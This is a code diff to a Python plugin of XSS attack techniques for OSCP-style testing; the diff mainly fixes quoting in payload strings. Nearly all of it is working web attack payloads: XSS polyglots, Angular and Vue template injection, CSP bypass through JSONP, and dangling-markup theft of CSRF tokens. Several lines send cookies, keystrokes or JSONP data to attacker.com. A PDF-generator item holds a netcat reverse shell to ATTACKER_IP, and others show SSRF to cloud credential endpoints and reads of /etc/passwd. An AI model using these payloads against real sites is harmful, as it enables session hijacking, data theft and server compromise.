@@ -550,8 +550,8 @@ class XSSAttacksPlugin(ServicePlugin):
                             'Input placed in template literal'
                         ],
                         'next_steps': [
-                            "If \\' blocked: Try closing script tag </script><script>alert(1)</script>",
-                            "If semicolon blocked: Use comma operator: \',alert(1),\\"',
+                            r"If \' blocked: Try closing script tag </script><script>alert(1)</script>",
+                            r"If semicolon blocked: Use comma operator: ',alert(1),\'",
                             'If in template literal: Use ${alert(1)}'
                         ],
                         'alternatives': [
@@ -569,7 +569,7 @@ class XSSAttacksPlugin(ServicePlugin):
                     'name': 'Template Literal Injection',
                     'type': 'command',
                     'metadata': {
-                        'command': f'curl "{base_url}/?name=$%7Balert(1)%7D" | grep "\\${alert"',
+                        'command': f'curl "{base_url}/?name=$%7Balert(1)%7D" | grep "${{alert"',
                         'description': 'Inject code in JavaScript template literals (backticks)',
                         'tags': ['OSCP:MEDIUM', 'MANUAL'],
                         'flag_explanations': {
@@ -589,14 +589,14 @@ class XSSAttacksPlugin(ServicePlugin):
                         ],
                         'next_steps': [
                             'Confirm context: <script>var x = `YOUR_INPUT`;</script>',
-                            "Try complex expressions: ${window.location=\'http://attacker.com\\"}',
+                            r"Try complex expressions: ${window.location='http://attacker.com'}",
                             'Check if this.constructor.constructor available'
                         ],
                         'alternatives': [
                             'Simple: ${alert(1)}',
-                            "Constructor: ${this.constructor.constructor(\'alert(1)\\")()}',
-                            "Fetch: ${fetch(\'http://attacker.com/\\"+document.cookie)}',
-                            "Eval: ${eval(\'alert(1)\\")}'
+                            r"Constructor: ${this.constructor.constructor('alert(1)')()}",
+                            r'Fetch: ${fetch("http://attacker.com/"+document.cookie)}',
+                            r"Eval: ${eval('alert(1)')}"
                         ],
                         'notes': 'Template literals use backticks: `string`. ${expression} executes JS inside. Common in modern JavaScript (ES6+). No need to escape quotes. Works in Angular/Vue/React template strings.'
                     }
@@ -693,10 +693,10 @@ class XSSAttacksPlugin(ServicePlugin):
                         'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                         'alternatives': [
                             'Universal: \\"><img src=x onerror=alert(1)>',
-                            "PortSwigger: jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
-                            "Rsnake: \';alert(String.fromCharCode(88,83,83))//\\";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"\'>alert(String.fromCharCode(88,83,83))</SCRIPT>',
+                            "PortSwigger: jaVasCript:/*-/*`/*\\`/*\\'/*\"/**/(/* */oNcliCk=alert() )//" + "%0D%0A%0d%0a" + "//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
+                            "Rsnake: ';alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\"'>alert(String.fromCharCode(88,83,83))</SCRIPT>",
                             'Minimal: \\"><svg onload=alert(1)>',
-                            "Browser-universal: \';alert(1);var x=\\"'
+                            '''Browser-universal: ';alert(1);var x=\"''',
                         ],
                         'success_indicators': [
                             'Alert fires in any context',
@@ -713,7 +713,7 @@ class XSSAttacksPlugin(ServicePlugin):
                             'Create custom polyglot based on allowed chars',
                             'Test minimal polyglot first, then complex'
                         ],
-                        'notes': "Polyglot = Universal XSS payload. \\"><img src=x onerror=alert(1)> works in: 1) HTML (injects tag) 2) Attribute (closes attribute with \\"> then injects) 3) JS string (closes string with \' then breaks out). OSCP: Start simple, escalate if needed."
+                        'notes': "Polyglot = Universal XSS payload. \\\"><img src=x onerror=alert(1)> works in: 1) HTML (injects tag) 2) Attribute (closes attribute with \\\"> then injects) 3) JS string (closes string with \\' then breaks out). OSCP: Start simple, escalate if needed."
                     }
                 },
                 {
@@ -725,8 +725,8 @@ class XSSAttacksPlugin(ServicePlugin):
                         'tags': ['OSCP:MEDIUM', 'MANUAL'],
                         'alternatives': [
                             '# Minimal payloads (tinyxss.terjanq.me):\n<svg/onload=alert``> (20 chars)\n<script src=//aa.es> (21 chars)\n<script src=//℡㏛.pw> (22 chars, Unicode expansion)',
-                            "# Import external script:\n<script src=//YOUR_VPS/x.js>\nimport(\'//YOUR_VPS/x.js\\")',
-                            "# Use existing functions:\nevalif(name)\nlocation=name\nlocation=\'/\\"+name',
+                            "# Import external script:\n<script src=//YOUR_VPS/x.js>\nimport('//YOUR_VPS/x.js\")",
+                            "# Use existing functions:\nevalif(name)\nlocation=name\nlocation='/\\\"+name",
                             '# Tiny redirect:\n<base href=//attacker.com>'
                         ],
                         'success_indicators': [
@@ -806,9 +806,9 @@ class XSSAttacksPlugin(ServicePlugin):
                         'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                         'alternatives': [
                             '# If script-src has unsafe-inline:\n<script>alert(1)</script> works normally',
-                            "# If script-src has unsafe-eval:\neval(\'alert(1)\\")\nsetTimeout(\\"alert(1)\')\nFunction(\\"alert(1)\')()',
+                            "# If script-src has unsafe-eval:\neval('alert(1)')\nsetTimeout(\"alert(1)\")\nFunction(\"alert(1)\")()",
                             '# Event handlers work with unsafe-inline:\n<img src=x onerror=alert(1)>',
-                            "# Check CSP:\nscript-src \'unsafe-inline\\" → Inline scripts allowed\nscript-src \\"unsafe-eval\' → eval() allowed"
+                            "# Check CSP:\nscript-src 'unsafe-inline' → Inline scripts allowed\nscript-src 'unsafe-eval' → eval() allowed"
                         ],
                         'success_indicators': [
                             'CSP contains unsafe-inline or unsafe-eval',
@@ -836,7 +836,7 @@ class XSSAttacksPlugin(ServicePlugin):
                         'description': 'Bypass CSP by abusing whitelisted domains with JSONP endpoints',
                         'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                         'alternatives': [
-                            "# Example CSP:\nscript-src \'self\\" https://api.google.com',
+                            "# Example CSP:\nscript-src 'self' https://api.google.com",
                             '# Google JSONP endpoints:\n<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>',
                             '# Common JSONP domains:\n- https://www.google.com/complete/search?client=chrome&q=test&callback=alert\n- https://api.vimeo.com/videos?callback=alert\n- https://graph.facebook.com/me?callback=alert',
                             '# Find JSONP:\ncurl "https://whitelisted-domain.com/api?callback=test" | grep "test("',
@@ -854,7 +854,7 @@ class XSSAttacksPlugin(ServicePlugin):
                         ],
                         'next_steps': [
                             'Test all whitelisted domains for JSONP',
-                            "Check for Angular/JSONP bypass: /api?callback=constructor.constructor(\'alert(1)\\")',
+                            "Check for Angular/JSONP bypass: /api?callback=constructor.constructor('alert(1)')",
                             'Try base-uri bypass if JSONP fails'
                         ],
                         'notes': 'JSONP = JSON with Padding. Endpoint: /api?callback=myFunc returns: myFunc({data}). If callback param unsanitized: ?callback=alert(1) → alert(1)({data}). Common vulnerable domains: Google APIs, Facebook Graph, Vimeo, CDNJS. OSCP: Enumerate CSP whitelisted domains, test for JSONP endpoints.'
@@ -949,7 +949,7 @@ class XSSAttacksPlugin(ServicePlugin):
                             '# JavaScript Execution sinks:\neval(userInput)\nFunction(userInput)\nsetTimeout(userInput)\nsetInterval(userInput)\nexecScript(userInput)',
                             '# HTML Injection sinks:\nelement.innerHTML = userInput\nelement.outerHTML = userInput\ndocument.write(userInput)\njQuery.html(userInput)',
                             '# URL Injection sinks:\nlocation.href = userInput\nlocation.assign(userInput)\nwindow.open(userInput)',
-                            "# Attribute Injection sinks:\nelement.setAttribute(\'src\\", userInput)\nelement.src = userInput',
+                            "# Attribute Injection sinks:\nelement.setAttribute('src', userInput)\nelement.src = userInput",
                             '# Search in DevTools:\nSources → Search (Ctrl+Shift+F): eval, innerHTML, document.write'
                         ],
                         'success_indicators': [
@@ -1042,19 +1042,19 @@ class XSSAttacksPlugin(ServicePlugin):
                             'Template syntax escaped'
                         ],
                         'next_steps': [
-                            "If 49: Test RCE: {{constructor.constructor(\'alert(1)\\")()}}',
+                            "If 49: Test RCE: {{constructor.constructor('alert(1)')()}}",
                             'Check Angular version: View Source for angular.js version',
                             'Angular 1.6+: Sandbox removed, easier exploitation',
                             'Angular <1.6: Use sandbox escape payloads'
                         ],
                         'alternatives': [
                             '# Detect: {{7*7}} → If output is 49: Angular detected',
-                            "# Angular 1.6+ (no sandbox):\n{{constructor.constructor(\'alert(1)\\"()\n{{$on.constructor(\\"alert(1)\')()}}",
-                            "# Angular <1.6 (sandbox bypass):\n{{x=constructor.constructor;x(\'alert(1)\\")()}}',
-                            "# Event-based:\n<input ng-focus=$event.view.alert(\'XSS\\")>',
-                            "# Google Research:\n<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match(\'x1\\") ? \\"\' : d.location=\\"//attacker.com/\'"></textarea></div>'
+                            "# Angular 1.6+ (no sandbox):\n{{constructor.constructor('alert(1)')()}}\n{{$on.constructor(\"alert(1)\")()}}",
+                            "# Angular <1.6 (sandbox bypass):\n{{x=constructor.constructor;x('alert(1)')()}}",
+                            "# Event-based:\n<input ng-focus=$event.view.alert('XSS')>",
+                            "# Google Research:\n<div ng-app ng-csp><textarea autofocus ng-focus=\"d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//attacker.com/'\"></textarea></div>"
                         ],
-                        'notes': "AngularJS CSTI: Inject {{expression}} in ng-app scope. Angular 1.6 removed sandbox → {{constructor.constructor(\'alert(1)\\"()}} works. Older versions: sandbox escape needed. Detect with {{7*7}}. OSCP: Check <html ng-app> or <div ng-app> in source.'
+                        'notes': "AngularJS CSTI: Inject {{expression}} in ng-app scope. Angular 1.6 removed sandbox → {{constructor.constructor('alert(1)')()}} works. Older versions: sandbox escape needed. Detect with {{7*7}}. OSCP: Check <html ng-app> or <div ng-app> in source."
                     }
                 },
                 {
@@ -1062,7 +1062,7 @@ class XSSAttacksPlugin(ServicePlugin):
                     'name': 'Vue.js Template Injection',
                     'type': 'command',
                     'metadata': {
-                        'command': f"curl "{base_url}/?name=%7B%7Bthis.constructor.constructor(\'alert(1)\\")()%7D%7D"',
+                        'command': f"curl \"{base_url}/?name=" + "%7B%7Bthis.constructor.constructor('alert(1)')()" + "%7D%7D\"",
                         'description': 'Test for Vue.js client-side template injection',
                         'tags': ['OSCP:MEDIUM', 'MANUAL'],
                         'flag_explanations': {
@@ -1082,18 +1082,18 @@ class XSSAttacksPlugin(ServicePlugin):
                         ],
                         'next_steps': [
                             'Check Vue version in source',
-                            "Test Vue 3 syntax: {{_openBlock.constructor(\'alert(1)\\")()}}',
+                            "Test Vue 3 syntax: {{_openBlock.constructor('alert(1)')()}}",
                             'Try v-html directive injection if {{}} fails',
                             'Check for CSP bypass opportunities'
                         ],
                         'alternatives': [
-                            "# Vue 2:\n{{this.constructor.constructor(\'alert(1)\\"())}}',
-                            "# Vue 3:\n{{_openBlock.constructor(\'alert(1)\\"(})}}',
+                            "# Vue 2:\n{{this.constructor.constructor('alert(1)')()}}",
+                            "# Vue 3:\n{{_openBlock.constructor('alert(1)')()}}",
                             '# Detect: {{7*7}} → Output 49 if Vue present',
-                            "# v-html injection:\n<div v-html="\'\\"constructor.constructor(\\"alert(1)\'()\\""></div>',
-                            "# Google Research:\n"><div v-html="\'\\".constructor.constructor(\\"d=document;d.location.hash.match(\'x1\\") ? `` : d.location=`//attacker.com`\')()"> aaa</div>'
+                            "# v-html injection:\n<div v-html=\"'\\\".constructor.constructor(\\\"alert(1)'()\\\")></div>",
+                            "# Google Research:\n\"><div v-html=\"'\\\".constructor.constructor(\\\"d=document;d.location.hash.match('x1') ? `` : d.location=`//attacker.com`')\\\")()> aaa</div>\"",
                         ],
-                        'notes': "Vue.js CSTI similar to Angular. Detect: {{7*7}} → 49. Exploit: {{this.constructor.constructor(\'alert(1)\\")()}}. Vue 3 changed internals: use {{_openBlock.constructor}}. OSCP: Check for Vue.js in page source or HTTP headers (X-Powered-By).'
+                        'notes': "Vue.js CSTI similar to Angular. Detect: {{7*7}} → 49. Exploit: {{this.constructor.constructor('alert(1)')()}}. Vue 3 changed internals: use {{_openBlock.constructor}}. OSCP: Check for Vue.js in page source or HTTP headers (X-Powered-By)."
                     }
                 },
                 {
@@ -1184,8 +1184,8 @@ class XSSAttacksPlugin(ServicePlugin):
                         'description': 'Measure page load time to infer information cross-origin',
                         'tags': ['OSCP:LOW', 'ADVANCED'],
                         'alternatives': [
-                            "# JavaScript timing attack:\nconst start = performance.now();\nconst img = new Image();\nimg.src = \'https://target.com/search?q=secret\\";\nimg.onload = () => {\n  const duration = performance.now() - start;\n  if (duration > 500) alert(\\"Results found!\');\n};",
-                            "# Iframe timing:\nconst iframe = document.createElement(\'iframe\\");\niframe.sandbox = \\"allow-scripts\'; // Block JS to measure only network time\nconst start = performance.now();\niframe.src = \\"https://target.com/search?q=secret\\";\niframe.onload = () => {\n  const duration = performance.now() - start;\n  console.log(\'Load time:\\", duration);\n};',
+                            "# JavaScript timing attack:\nconst start = performance.now();\nconst img = new Image();\nimg.src = 'https://target.com/search?q=secret';\nimg.onload = () => {\n  const duration = performance.now() - start;\n  if (duration > 500) alert(\"Results found!\");\n};",
+                            "# Iframe timing:\nconst iframe = document.createElement('iframe');\niframe.sandbox = \"allow-scripts\"; // Block JS to measure only network time\nconst start = performance.now();\niframe.src = \"https://target.com/search?q=secret\";\niframe.onload = () => {\n  const duration = performance.now() - start;\n  console.log('Load time:', duration);\n};",
                             '# Advanced: Force heavy task after load\niframe.onload = () => {\n  // Measure time for postMessage response\n  // Slow = large search results (heavy DOM)\n  // Fast = no results (light DOM)\n};'
                         ],
                         'success_indicators': [
@@ -1216,7 +1216,7 @@ class XSSAttacksPlugin(ServicePlugin):
                         'description': 'Count iframes cross-origin to infer page content',
                         'tags': ['OSCP:LOW', 'ADVANCED'],
                         'alternatives': [
-                            "# Frame counting attack:\nconst iframe = document.createElement(\'iframe\\");\niframe.src = \\"https://target.com/results?search=secret\';\ndocument.body.appendChild(iframe);\niframe.onload = () => {\n  const frameCount = iframe.contentWindow.length;\n  // If results: frameCount > 0 (pagination iframes)\n  // If no results: frameCount == 0\n  console.log(\\"Frame count:\', frameCount);\n};',
+                            "# Frame counting attack:\nconst iframe = document.createElement('iframe');\niframe.src = \"https://target.com/results?search=secret\";\ndocument.body.appendChild(iframe);\niframe.onload = () => {\n  const frameCount = iframe.contentWindow.length;\n  // If results: frameCount > 0 (pagination iframes)\n  // If no results: frameCount == 0\n  console.log('Frame count:', frameCount);\n};",
                             '# Readable cross-origin:\nwindow.frames.length → Accessible cross-origin\nwindow.frame[0] → Blocked by SOP, but .length works',
                             '# Use case:\nSearch results page with pagination iframes:\n- Results found: Multiple iframes (page 1, 2, 3...)\n- No results: Zero iframes',
                             '# Binary search extraction:\nfor (let i=0; i<256; i++) {\n  testChar(String.fromCharCode(i));\n}'
@@ -1261,8 +1261,8 @@ class XSSAttacksPlugin(ServicePlugin):
                         'description': 'Exploit HTML scriptless injection when XSS is impossible',
                         'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                         'alternatives': [
-                            "# Scenario: < allowed but <script> blocked\nImpossible: <script>alert(1)</script>\nPossible: <img src=\'http://attacker.com?data=",
-                            "# Dangling markup attack:\n<img src=\'http://attacker.com?leak=\n<!-- Rest of HTML becomes part of src attribute -->\n<input name="csrf" value="SECRET_TOKEN">",
+                            "# Scenario: < allowed but <script> blocked\nImpossible: <script>alert(1)</script>\nPossible: <img src='http://attacker.com?data=",
+                            "# Dangling markup attack:\n<img src='http://attacker.com?leak=\n<!-- Rest of HTML becomes part of src attribute -->\n<input name=\"csrf\" value=\"SECRET_TOKEN\">",
                             '# Attacker receives:\nGET /?leak=<input name="csrf" value="SECRET_TOKEN"> HTTP/1.1',
                             '# Key concept: Unclosed attribute captures subsequent HTML',
                             '# Requirements:\n1. Inject < allowed\n2. Single quote allowed\n3. Target data appears after injection\n4. No > before target data'
@@ -1292,7 +1292,7 @@ class XSSAttacksPlugin(ServicePlugin):
                     'name': 'CSRF Token Theft via Dangling Markup',
                     'type': 'command',
                     'metadata': {
-                        'command': f"curl "{base_url}/?comment=<img src=\'http://YOUR_VPS:8000?leak=" | grep -A 5 csrf",
+                        'command': f"curl \"{base_url}/?comment=<img src='http://YOUR_VPS:8000?leak=\" | grep -A 5 csrf",
                         'description': 'Steal CSRF token using dangling markup when XSS blocked',
                         'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                         'flag_explanations': {
@@ -1319,11 +1319,11 @@ class XSSAttacksPlugin(ServicePlugin):
                             'Use stolen token for CSRF attack'
                         ],
                         'alternatives': [
-                            "# Various payloads:\n<img src=\'http://attacker.com?leak=\n<style>@import\\"http://attacker.com?leak=\n<link rel=stylesheet href=\\"http://attacker.com?leak=\n<base href=\'http://attacker.com/\n<meta http-equiv=refresh content=\\"0;url=http://attacker.com?leak=',
+                            "# Various payloads:\n<img src='http://attacker.com?leak=\n<style>@import\"http://attacker.com?leak=\n<link rel=stylesheet href=\"http://attacker.com?leak=\n<base href='http://attacker.com/\n<meta http-equiv=refresh content=\"0;url=http://attacker.com?leak=",
                             '# Setup listener:\npython3 -m http.server 8000\nnc -lvnp 8000',
-                            "# Full exploit:\n1. Find injection before CSRF token\n2. Inject: <img src=\'http://YOUR_IP?leak=\n3. Victim loads page → Browser fetches image\n4. Image URL contains CSRF token\n5. Attacker logs capture token"
+                            "# Full exploit:\n1. Find injection before CSRF token\n2. Inject: <img src='http://YOUR_IP?leak=\n3. Victim loads page → Browser fetches image\n4. Image URL contains CSRF token\n5. Attacker logs capture token"
                         ],
-                        'notes': "Attack chain: 1) Inject <img src=\'http://attacker?data= 2) Browser sends GET with all HTML until next \\" 3) CSRF token captured in URL 4) Use token for CSRF. OSCP: Setup Python HTTP server to capture. Dangling markup bypasses XSS filters but still leaks data.'
+                        'notes': "Attack chain: 1) Inject <img src='http://attacker?data= 2) Browser sends GET with all HTML until next \" 3) CSRF token captured in URL 4) Use token for CSRF. OSCP: Setup Python HTTP server to capture. Dangling markup bypasses XSS filters but still leaks data."
                     }
                 }
             ]
@@ -1351,7 +1351,7 @@ class XSSAttacksPlugin(ServicePlugin):
                             '# Example vulnerable endpoint:\nhttps://api.example.com/userdata.js:\n  var userData = {"email":"victim@example.com", "ssn":"123-45-6789"};',
                             '# Exploit:\n<script src="https://api.example.com/userdata.js"></script>\n<script>alert(userData.ssn);</script>',
                             '# JSONP vulnerable pattern:\nhttps://api.example.com/data?callback=processData:\n  processData({"secret":"data"});',
-                            "# Exploit JSONP:\n<script>\n  function processData(data) {\n    fetch(\'http://attacker.com?stolen=\\" + JSON.stringify(data));\n  }\n</script>\n<script src="https://api.example.com/data?callback=processData"></script>'
+                            "# Exploit JSONP:\n<script>\n  function processData(data) {\n    fetch('http://attacker.com?stolen=' + JSON.stringify(data));\n  }\n</script>\n<script src=\"https://api.example.com/data?callback=processData\"></script>",
                         ],
                         'success_indicators': [
                             'Sensitive data in JavaScript file',
@@ -1371,7 +1371,7 @@ class XSSAttacksPlugin(ServicePlugin):
                             'Check if authentication cookies sent with <script> requests',
                             'Build exploit page to exfiltrate data'
                         ],
-                        'notes': "XSSI = Include victim\'s authenticated JS file cross-origin. Key: <script src=> ignores CORS. If endpoint returns: var secret="data"; → Attacker can read via <script> inclusion. JSONP worse: Attacker controls callback function. OSCP: LOW relevance. Modern APIs use JSON (not JavaScript) + CORS."
+                        'notes': "XSSI = Include victim's authenticated JS file cross-origin. Key: <script src=> ignores CORS. If endpoint returns: var secret=\"data\"; → Attacker can read via <script> inclusion. JSONP worse: Attacker controls callback function. OSCP: LOW relevance. Modern APIs use JSON (not JavaScript) + CORS."
                     }
                 },
                 {
@@ -1383,7 +1383,7 @@ class XSSAttacksPlugin(ServicePlugin):
                         'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                         'alternatives': [
                             '# Identify JSONP:\ncurl "https://api.example.com/user?callback=test"\n→ Output: test({"email":"victim@example.com"})',
-                            "# Build exploit page:\n<script>\nfunction stealData(data) {\n  fetch(\'http://attacker.com/collect\\", {\n    method: \\"POST\',\n    body: JSON.stringify(data)\n  });\n}\n</script>\n<script src="https://api.example.com/user?callback=stealData"></script>",
+                            "# Build exploit page:\n<script>\nfunction stealData(data) {\n  fetch('http://attacker.com/collect', {\n    method: \"POST\",\n    body: JSON.stringify(data)\n  });\n}\n</script>\n<script src=\"https://api.example.com/user?callback=stealData\"></script>",
                             '# Advanced: Hijack existing callback\nIf page uses: angular.callbacks._7\nInject before script loads:\n<script>\nvar angular = {callbacks: {}};\nangular.callbacks._7 = function(data) {\n  alert(JSON.stringify(data));\n};\n</script>\n<script src="https://vulnerable-api.com/data?callback=angular.callbacks._7"></script>',
                             '# Send to victim (phishing)\nVictim visits attacker page → Authenticated JSONP request → Data stolen'
                         ],
@@ -1406,7 +1406,7 @@ class XSSAttacksPlugin(ServicePlugin):
                             'Setup data collection server',
                             'Craft phishing page'
                         ],
-                        'notes': "JSONP = JSON with Padding. Endpoint: /api?callback=myFunc returns: myFunc({data}). Attacker controls callback function → Steals data. Check: curl \'URL?callback=test\\" → If returns test({...}): Vulnerable. OSCP: Check APIs for ?callback= param. Modern apps avoid JSONP (use CORS instead).'
+                        'notes': "JSONP = JSON with Padding. Endpoint: /api?callback=myFunc returns: myFunc({data}). Attacker controls callback function → Steals data. Check: curl 'URL?callback=test' → If returns test({...}): Vulnerable. OSCP: Check APIs for ?callback= param. Modern apps avoid JSONP (use CORS instead)."
                     }
                 }
             ]
@@ -1515,7 +1515,7 @@ class XSSAttacksPlugin(ServicePlugin):
                             '# XSS in PDF (client-side execution when PDF opened):\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>',
                             '# SSRF via PDF:\n<iframe src="http://127.0.0.1:8080/admin"></iframe>\n<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">',
                             '# LFI via PDF:\n<iframe src="file:///etc/passwd"></iframe>\n<img src="file:///c:/windows/win.ini">',
-                            "# RCE via PDF (if Node.js PDF libs):\n<script>require(\'child_process\\").exec(\\"nc ATTACKER_IP 4444 -e /bin/sh\')</script>",
+                            "# RCE via PDF (if Node.js PDF libs):\n<script>require('child_process').exec(\"nc ATTACKER_IP 4444 -e /bin/sh\")</script>",
                             '# Test endpoint:\nPOST /api/generate-pdf\n{"html": "<script>alert(1)</script>"}'
                         ],
                         'success_indicators': [
@@ -1538,7 +1538,7 @@ class XSSAttacksPlugin(ServicePlugin):
                             'Test LFI: <iframe src=file:///etc/passwd>',
                             'If Node.js: Test RCE with require()'
                         ],
-                        'notes': "PDF XSS: wkhtmltopdf, headless Chrome, puppeteer convert HTML→PDF. If user HTML not sanitized: XSS (client), SSRF (server), LFI (server). High impact: RCE possible via Node require(\'child_process\\"). OSCP: Check PDF export features. Test: <iframe src=file:///etc/passwd></iframe>'
+                        'notes': "PDF XSS: wkhtmltopdf, headless Chrome, puppeteer convert HTML→PDF. If user HTML not sanitized: XSS (client), SSRF (server), LFI (server). High impact: RCE possible via Node require('child_process'). OSCP: Check PDF export features. Test: <iframe src=file:///etc/passwd></iframe>"
                     }
                 }
             ]
@@ -1560,7 +1560,7 @@ class XSSAttacksPlugin(ServicePlugin):
                     '# Screenshot requirements:\n- URL visible\n- alert(document.domain) popup\n- Parameter value visible',
                     '# Report template:\n## XSS Vulnerability\n**Parameter:** search\n**Context:** Raw HTML\n**Payload:** <script>alert(document.domain)</script>\n**Impact:** Session hijacking, defacement, phishing\n**Remediation:** Implement output encoding and CSP',
                     '# Proof of concept:\ncurl "{base_url}/?search=<script>alert(document.domain)</script>"\nScreenshot: xss-proof.png',
-                    "# Advanced impact demo:\n- Session stealing: <script>fetch(\'http://attacker.com/?cookie=\\"+document.cookie)</script>\n- Keylogging: <script>document.onkeypress=function(e){fetch(\\"http://attacker.com/?key=\'+e.key)}</script>\n- Defacement: <script>document.body.innerHTML=\\"HACKED\'</script>'
+                    "# Advanced impact demo:\n- Session stealing: <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>\n- Keylogging: <script>document.onkeypress=function(e){fetch(\"http://attacker.com/?key=\"+e.key)}</script>\n- Defacement: <script>document.body.innerHTML=\"HACKED\"</script>",
                 ],
                 'success_indicators': [
                     'XSS confirmed with alert(document.domain)',
